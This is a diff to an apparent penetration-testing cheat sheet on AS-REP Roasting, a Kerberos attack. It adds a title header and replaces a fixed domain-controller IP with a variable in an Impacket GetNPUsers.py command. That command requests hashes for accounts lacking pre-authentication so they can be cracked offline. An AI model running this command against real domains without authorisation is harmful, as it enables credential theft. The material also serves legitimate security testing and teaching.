@@ -1,3 +1,7 @@
+---
+title: "ASREP Roasting"
+---
+
 # AS-REP Roasting
 
 > Extract TGTs from user accounts without Kerberos pre-authentication, and crack their encrypted content offline.
@@ -15,7 +19,7 @@ AS-REP Roasting targets **Kerberos user accounts** that have the `DONT_REQ_PREAU
 ### Get hashes from user wordlist (unauthenticated)
 
 ```bash
-GetNPUsers.py domain.lan/ -usersfile users.txt -dc-ip 192.168.1.10 \
+GetNPUsers.py domain.lan/ -usersfile users.txt -dc-ip $DC_IP \
   -no-pass -request -format hashcat -outputfile asrep_hashes.txt
 ```
 
